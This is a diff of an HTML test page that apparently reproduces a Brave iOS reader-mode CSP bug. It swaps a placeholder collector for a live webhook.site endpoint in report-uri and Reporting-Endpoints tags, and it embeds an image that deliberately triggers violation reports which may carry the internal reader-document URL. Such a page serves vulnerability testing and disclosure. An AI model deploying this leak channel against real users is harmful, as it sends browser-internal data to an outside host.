@@ -5,44 +5,33 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Reader CSP verification article</title>
 
-<!--
-  TEST CSP META TAGS
-  Replace COLLECTOR_URL with your HTTPS request-logging endpoint (for example, a RequestBin or a tunnelled local server).
-  Do not use github.io, because it will not log reports.
-
-  Policy 1: img-src, style-src, script-src, report-uri, report-to
-  Policy 2: default-src and report-uri only (no img-src)
--->
 <meta http-equiv="Content-Security-Policy"
-  content="img-src 'none'; style-src 'none'; script-src 'none'; report-uri COLLECTOR_URL/leak; report-to leakgroup">
+  content="img-src 'none'; style-src 'none'; script-src 'none'; report-uri https://webhook.site/2f033f56-e784-42f0-8d92-7e1774e4e08b/leak; report-to leakgroup">
 <meta http-equiv="Content-Security-Policy"
-  content="default-src 'none'; report-uri COLLECTOR_URL/leak2">
+  content="default-src 'none'; report-uri https://webhook.site/2f033f56-e784-42f0-8d92-7e1774e4e08b/leak2">
 </head>
 
 <body>
 <article>
 <h1>Reader CSP verification article</h1>
-<p>By QA test harness, Brave iOS reader mode</p>
+<p>By QA test, Brave iOS reader mode</p>
 
-<!-- Reporting-Endpoints in body, matching the original report's bypass -->
 <meta http-equiv="Reporting-Endpoints"
-  content='leakgroup="COLLECTOR_URL/leak"'>
+  content='leakgroup="https://webhook.site/2f033f56-e784-42f0-8d92-7e1774e4e08b/leak"'>
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Example.jpg" alt="Example image to violate img-src">
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Example.jpg" alt="Example image">
 
-<p>This page exists to exercise Brave iOS reader mode and how CSP meta tags are copied into the reader document. The reader mode button appears when the page scores high enough on readability, which depends on the length of continuous prose.</p>
+<p>This page exists to test how Brave iOS reader mode handles CSP meta tags. Reader mode appears only when a page has enough continuous text, so this page includes several full paragraphs.</p>
 
-<p>Readability algorithms of the Arc90 lineage walk the document looking for block-level elements that hold substantial text. They score each element by text length, then decide whether a reading view is offered. Short pages, navigation-heavy pages, and pages made mostly of links or images tend to fall below the threshold.</p>
+<p>Readability algorithms score block-level elements by how much text they contain. Short pages, link-heavy pages, and image-heavy pages usually score too low to offer a reading view.</p>
 
-<p>To keep the test deterministic, paragraphs here are written as full sentences. The scoring function rewards longer runs of text and ignores short fragments, so stacking several paragraphs of this length reliably offers reader mode.</p>
+<p>When reader mode opens, the browser copies some CSP meta tags from the original page into the reader document. This test checks which of those tags survive and whether any violation reports are sent to the collector.</p>
 
-<p>Once reader mode is available, the browser takes CSP meta tags from the original page and decides which ones to carry into the reader document. The test checks whether reporting directives survive and whether violation reports include the internal document URL.</p>
+<p>The second policy above has no img-src directive. If anything from that policy appears in the reader page, or a report arrives at the collector mentioning it, record a failure.</p>
 
-<p>The second policy in the head contains no img-src directive. Check whether that policy, or its reporting endpoint, appears in the reader document or reaches the collector. Record any such trace as a failure and attach the evidence.</p>
+<p>The image above violates img-src 'none', which should trigger one violation report on a vulnerable build.</p>
 
-<p>The image above violates img-src 'none', which should generate a violation report. This gives a trigger for the reporting path without additional scripting.</p>
-
-<p>If you can read this in a stripped-down reader view, reader mode is active. Inspect the reader document head with Safari Web Inspector and watch the collector for inbound violation reports.</p>
+<p>If you can read this in a clean reader view, reader mode is active. Check webhook.site for incoming requests.</p>
 </article>
 </body>
 </html>
